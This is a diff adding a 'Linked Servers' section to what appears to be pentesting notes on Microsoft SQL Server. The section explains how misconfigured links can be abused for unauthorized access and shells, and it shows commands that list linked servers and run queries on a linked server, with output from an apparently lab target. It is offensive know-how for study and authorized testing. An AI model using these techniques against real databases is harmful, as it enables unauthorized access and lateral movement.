@@ -461,6 +461,30 @@ VERBOSE: 0 instances were found.
 
 More commands can be found in the github repo.
 
+### Linked Servers
+
+Microsoft SQL Server allows links to be created to external data sources such as other SQL servers, Oracle databases, excel spreadsheets, and so on. Due to common misconfigurations the links, or “Linked Servers”, can often be exploited to traverse database link networks, gain unauthorized access to data, and deploy shells.
+
+Source: [https://blog.netspi.com/how-to-hack-database-links-in-sql-server/](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
+
+Find linked servers:
+
+```text
+SQL> select srvname from sysservers;
+srvname
+------------------------------   
+COMPATIBILITY\POO_CONFIG
+COMPATIBILITY\POO_PUBLIC  
+```
+
+Execute commands on the other server:
+
+```text
+SQL> EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
+------------------------------   
+COMPATIBILITY\POO_CONFIG 
+```
+
 ## Enable xp\_cmdshell
 
 ### Check if enabled 
